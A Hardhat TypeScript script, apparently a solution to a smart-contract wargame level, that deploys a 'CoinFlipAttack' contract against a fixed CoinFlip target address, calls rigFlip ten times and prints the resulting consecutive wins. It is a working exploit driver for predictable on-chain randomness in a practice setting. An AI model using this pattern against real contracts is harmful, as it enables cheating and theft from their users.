import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {
  CoinFlipAttack,
  CoinFlipAttack__factory,
  CoinFlip,
  CoinFlip__factory,
} from "../typechain-types";

async function main() {
  let owner: SignerWithAddress;
  let CoinFlipAttackInstance: CoinFlipAttack;

  [owner] = await ethers.getSigners();

  // The contract we're rigging the flip for
  const targetContractAddress = "0xd1790B2f807212d9C06016d02827aE2D49fb2023";

  const CoinFlipAttackFactory = new CoinFlipAttack__factory(owner);
  CoinFlipAttackInstance = await CoinFlipAttackFactory.deploy(
    targetContractAddress
  );
  await CoinFlipAttackInstance.deployed();
  console.log(
    "CoinFlipAttack contract deployed to: " + CoinFlipAttackInstance.address
  );

  const CoinFlipFactory = new CoinFlip__factory(owner);
  const TargetContract = CoinFlipFactory.attach(targetContractAddress);

  // Rigging the flip 10 times
  let txn;
  console.log("Rigging flip...");
  try {
    for (let i = 0; i < 10; i++) {
      console.log("Flip # " + i);
      txn = await CoinFlipAttackInstance.connect(owner).rigFlip({
        gasLimit: 85000,
      });
      await txn.wait();

      // sleep(30000); // waiting till we're on the next block
    }
  } catch (error) {
    console.log(error);
  }

  // Checking contract's consecutive wins
  const consecutiveWins = await TargetContract.connect(owner).consecutiveWins();
  console.log(Number(consecutiveWins) + " consecutive wins so far");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
